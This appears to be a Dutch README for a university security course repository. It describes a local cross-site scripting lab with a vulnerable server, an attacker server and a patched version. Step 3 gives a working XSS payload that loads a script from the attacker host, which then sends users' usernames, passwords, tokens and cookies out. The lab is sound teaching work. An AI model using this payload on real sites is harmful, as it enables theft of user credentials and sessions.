De opdracht folders bevatten de uitwerkingen van de opdrachten, met daarbij diagrammen en toelichtingen.

# Portfolio

De diagrammen zijn samen met de toelichtingen verwerkt in het portfolio. Deze kan bekeken worden door de commando's `npm install` en `ng serve` uit te voeren in de portfolio directory. Het portfolio wordt vervolgens weergegeven op http://localhost:4200/.

Ook is het mogelijk het portfolio te bekijken door het volgende bestand te openen in de browser:
[portfolio/dist/security2-portfolio/index.html](portfolio/dist/security2-portfolio/index.html)

# Opdracht 3

Om een cross site scripting aanval uit te voeren moeten er twee node servers gestart worden. Hiervoor moet het commando `npm install` uitgevoerd worden in de "assignment3" directory, gevolgd door het commando `node index.js` in de onderliggende "server" directory en `node attacker.js` in de "attacker" directory.

Zodra de servers aanstaan kan er een xss aanval uitgevoerd worden door de volgende stappen te doorlopen:

1. Open http://localhost:3000/ in de browser.
2. Log in als "user1" met als wachtwoord "password1".
3. Verstuur het volgende bericht: `<img src=/ onerror='with(top)body.appendChild (createElement("script")).src="http://localhost:4000/credentials.js"'>`
4. De volgende keer dat er wordt ingelogd zal na 5 seconden de gebruikte gebruikersnaam, wachtwoord, authenticatie token en cookie doorgestuurd worden naar de server van de attacker. Deze gegevens worden weergegeven in de terminal waar de attacker server gestart is.

In de "patched" directory is een versie van de server beschikbaar die niet langer vatbaar is voor deze aanval, door gebruik te maken van input sanitization, zowel op de server als in de browser.

# Opdracht 4

De directory voor opdracht 4 bevat een batch file genaamd "test.bat", deze kan uitgevoerd worden om de TxHandler te testen.
